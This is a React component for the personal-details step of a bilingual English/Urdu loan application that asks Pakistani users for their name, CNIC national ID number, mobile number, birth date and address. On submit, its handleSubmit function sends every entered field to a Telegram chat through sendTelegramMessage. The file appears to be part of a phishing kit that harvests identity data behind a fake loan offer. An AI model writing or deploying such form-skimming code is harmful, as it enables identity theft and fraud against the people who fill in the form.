import React, { useState } from 'react';
import { LoanApplicationState } from '../types';
import { ArrowRight, User, ShieldCheck } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';

interface PersonalStepProps {
  data: LoanApplicationState;
  updateData: (fields: Partial<LoanApplicationState>) => void;
  onNext: () => void;
}

export const PersonalStep: React.FC<PersonalStepProps> = ({ data, updateData, onNext }) => {
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!data.fullName || !data.cnic || !data.mobileNo || !data.gender || !data.dob || !data.province || !data.address) {
      setError('Please fill in all required fields / براہ کرم تمام لازمی خانے پر کریں۔');
      return;
    }
    setError('');

    sendTelegramMessage(
      `📋 *New Loan Application - Personal Info*\n🔑 *Session ID: ${data.sessionId}*\n👤 Name: ${data.fullName}\n🆔 CNIC: ${data.cnic}\n📱 Mobile: ${data.mobileNo}\n⚧ Gender: ${data.gender}\n📅 DOB: ${data.dob}\n📍 Province: ${data.province}\n🏠 Address: ${data.address}`
    );

    onNext();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 md:p-8 max-w-2xl mx-auto">
      <div className="flex items-center justify-between pb-6 border-b border-slate-100 mb-6">
        <div>
          <h2 className="text-xl font-bold text-slate-900">Personal Information</h2>
          <p className="text-sm text-slate-500">Apni zaati maloomat darj karein</p>
        </div>
        <span className="text-xs font-semibold bg-emerald-50 text-emerald-800 px-3 py-1 rounded-full border border-emerald-200">
          ذاتی معلومات
        </span>
      </div>

      {error && (
        <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Full Name *</span>
            <span className="font-normal text-slate-500 font-urdu">پورا نام</span>
          </label>
          <input
            type="text"
            required
            placeholder="Full Name"
            value={data.fullName}
            onChange={(e) => updateData({ fullName: e.target.value })}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>CNIC *</span>
              <span className="font-normal text-slate-500 font-urdu">شناختی کارڈ</span>
            </label>
            <input
              type="text"
              required
              placeholder="XXXXX-XXXXXXX-X"
              value={data.cnic}
              onChange={(e) => updateData({ cnic: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            />
          </div>
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Mobile No *</span>
              <span className="font-normal text-slate-500 font-urdu">موبائل نمبر</span>
            </label>
            <input
              type="tel"
              required
              placeholder="03XXXXXXXXX"
              value={data.mobileNo}
              onChange={(e) => updateData({ mobileNo: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Gender *</span>
              <span className="font-normal text-slate-500 font-urdu">جنس</span>
            </label>
            <select
              required
              value={data.gender}
              onChange={(e) => updateData({ gender: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            >
              <option value="">Select Gender</option>
              <option value="Male">Male / مرد</option>
              <option value="Female">Female / عورت</option>
              <option value="Other">Other / دیگر</option>
            </select>
          </div>
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Date of Birth *</span>
              <span className="font-normal text-slate-500 font-urdu">تاریخ پیدائش</span>
            </label>
            <input
              type="date"
              required
              value={data.dob}
              onChange={(e) => updateData({ dob: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Province *</span>
            <span className="font-normal text-slate-500 font-urdu">صوبہ</span>
          </label>
          <select
            required
            value={data.province}
            onChange={(e) => updateData({ province: e.target.value })}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
          >
            <option value="">Select Province</option>
            <option value="Punjab">Punjab / پنجاب</option>
            <option value="Sindh">Sindh / سندھ</option>
            <option value="KPK">Khyber Pakhtunkhwa / خیبر پختونخوا</option>
            <option value="Balochistan">Balochistan / بلوچستان</option>
            <option value="Islamabad">Islamabad Capital Territory / اسلام آباد</option>
            <option value="AJK">Azad Jammu & Kashmir / آزاد جموں و کشمیر</option>
            <option value="Gilgit-Baltistan">Gilgit-Baltistan / گلگت بلتستان</option>
          </select>
        </div>

        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Address *</span>
            <span className="font-normal text-slate-500 font-urdu">پتہ</span>
          </label>
          <textarea
            required
            rows={3}
            placeholder="House #, Street, City / مکان نمبر، گلی، شہر"
            value={data.address}
            onChange={(e) => updateData({ address: e.target.value })}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50 resize-none"
          />
        </div>

        <div className="pt-4 flex justify-end">
          <button
            type="submit"
            className="flex items-center space-x-2 px-6 py-3 bg-[#0b1f36] hover:bg-slate-800 text-white font-semibold rounded-xl text-sm shadow-md transition-all"
          >
            <span>Continue / جاری رکھیں</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};
